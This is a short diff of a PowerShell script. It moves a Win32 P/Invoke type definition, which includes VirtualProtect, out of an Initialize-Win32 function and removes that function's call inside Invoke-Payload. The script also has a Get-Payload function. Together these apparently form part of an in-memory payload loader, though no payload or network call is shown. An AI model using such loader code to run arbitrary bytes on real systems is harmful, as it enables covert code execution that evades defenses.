@@ -41,10 +41,8 @@ $Script:DefaultTag = 'preview'
 # Win32 P/Invoke Definitions
 # =============================================================================
 
-function Initialize-Win32 {
-    if (('Win32' -as [type]) -and ('PayloadEntry' -as [type])) { return }
-
-    try { Add-Type -TypeDefinition @'
+if (-not ('Win32' -as [type])) {
+    Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
 
@@ -71,10 +69,6 @@ public static class Win32 {
         IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 }
 '@
-    } catch {
-        # Types may already exist from a prior run in this session
-        if ($_.Exception.Message -notmatch 'already exists') { throw }
-    }
 }
 
 # =============================================================================
@@ -206,8 +200,6 @@ function Get-Payload {
 
 function Invoke-Payload {
     param([byte[]]$Data)
-
-    Initialize-Win32
 
     $size = [UIntPtr]::new($Data.Length)
 
